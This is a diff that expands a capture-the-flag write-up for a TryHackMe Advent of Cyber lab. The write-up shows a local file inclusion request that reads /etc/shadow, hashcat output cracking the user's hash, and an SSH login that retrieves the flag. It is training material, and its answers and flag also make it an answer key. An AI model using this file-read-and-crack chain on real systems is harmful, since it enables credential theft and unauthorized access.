@@ -1,7 +1,7 @@
 # TryHackMe [Advent of Cyber 1](https://tryhackme.com/room/25daysofchristmas) Day 15
 ### References
 * Spring, B. (2019, December 14). Local File Inclusion. TryHackMe Blog. https://blog.tryhackme.com/lfi/
-## What is Charlie going to book a holiday to?
+## Reconnaissance
 ```bash
 $ sudo nmap -sV -sC -vv 10.10.129.142
 PORT   STATE SERVICE REASON         VERSION
@@ -20,7 +20,18 @@ PORT   STATE SERVICE REASON         VERSION
 |_http-title: Public Notes
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+## What is Charlie going to book a holiday to?
+* From the website's homepage:
+> ### Note 3
+> #### To do list:
+> * Take Santa sleigh in for an MOT
+> * Improve security on file inclusion
+> * Go food shopping
+> * Book holiday to Hawaii
 
+**Answer**: `Hawaii`
+## Read `/etc/shadow` and crack Charlie's password.
+1. With Burpsuit, proxy the website and look for a request to the `/notes/note1.txt` file (file system path `/` are encoded to `%2f` in URLs):
 ```http
 GET /get-file/views%2fnotes%2fnote1.txt HTTP/1.1
 Host: 10.10.210.111
@@ -32,7 +43,7 @@ Accept-Encoding: gzip, deflate
 Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
 Connection: close
 ```
-
+2. Modify the request path to point to `/etc/shadow`:
 ```http
 GET /get-file/%2fetc%2fshadow HTTP/1.1
 Host: 10.10.210.111
@@ -44,7 +55,7 @@ Accept-Encoding: gzip, deflate
 Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
 Connection: close
 ```
-
+3. `/etc/shadow`'s contents will be rendered on the webpage:
 ```
 root:*:18152:0:99999:7:::
 daemon:*:18152:0:99999:7:::
@@ -79,8 +90,7 @@ pollinate:*:18152:0:99999:7:::
 ubuntu:!:18243:0:99999:7:::
 charlie:$6$oHymLspP$wTqsTmpPkz.u/CQDbheQjwwjyYoVN2rOm6CDu0KDeq8mN4pqzuna7OX.LPdDPCkPj7O9TB0rvWfCzpEkGOyhL.:18243:0:99999:7:::
 ```
-
-## Read `/etc/shadow` and crack Charlies password.
+4. Use `hashcat` to crack Charlie's password:
 ```bash
 $ hashcat -a 0 -m 1800 '$6$oHymLspP$wTqsTmpPkz.u/CQDbheQjwwjyYoVN2rOm6CDu0KDeq8mN4pqzuna7OX.LPdDPCkPj7O9TB0rvWfCzpEkGOyhL.' rockyou.txt
 $6$oHymLspP$wTqsTmpPkz.u/CQDbheQjwwjyYoVN2rOm6CDu0KDeq8mN4pqzuna7OX.LPdDPCkPj7O9TB0rvWfCzpEkGOyhL.:password1
@@ -101,5 +111,16 @@ Restore.Point....: 0/14344384 (0.00%)
 Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:4992-5000
 Candidates.#2....: 123456 -> dangerous
 ```
-## What is `flag1.txt`?
 
+**Answer**: `password1`
+## What is `flag1.txt`?
+* Connect to Charlie's server with SSH using the previously found credentials:
+```bash
+$ ssh charlie@10.10.210.111
+charlie@10.10.210.111's password: password1
+charlie@ip-10-10-210-111:~$ ls
+flag1.txt
+charlie@ip-10-10-210-111:~$ cat flag1.txt 
+THM{4ea2adf842713ad3ce0c1f05ef12256d}
+```
+**Flag**: `THM{4ea2adf842713ad3ce0c1f05ef12256d}`
